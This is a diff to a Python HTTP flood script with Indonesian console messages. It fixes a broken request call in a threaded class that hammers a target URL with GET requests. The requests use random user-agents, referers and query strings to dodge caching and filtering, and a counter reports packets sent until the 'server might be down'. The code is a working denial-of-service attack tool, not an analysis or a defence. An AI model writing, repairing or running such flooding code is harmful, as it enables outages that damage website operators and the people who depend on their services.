@@ -1,7 +1,6 @@
 #!usr/bin/python
 import os
 import requests
-import aiohttp
 import threading
 import datetime
 import sys
@@ -86,12 +85,11 @@ class httpth1(threading.Thread):
             try:
                 headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
-                requests.aiohttp.get(randomized_url, headers=headers)
+                requests.get(randomized_url, headers=headers)
                 u += 1
-                print("aiohttp")
                 print("\033[92m[\033[97m+\033[92m]\033[92mNOZZ: " +str(u)+ " \033[96mMENGIRIMKAN PAKET ke" +str()+ " \033[97m" +url+ "\033[0m" )
     
-            except requests.aiohttp.exceptions.ConnectionError:
+            except requests.exceptions.ConnectionError:
                 print ("[Server might be down!]")
                 pass
             except requests.exceptions.InvalidSchema:
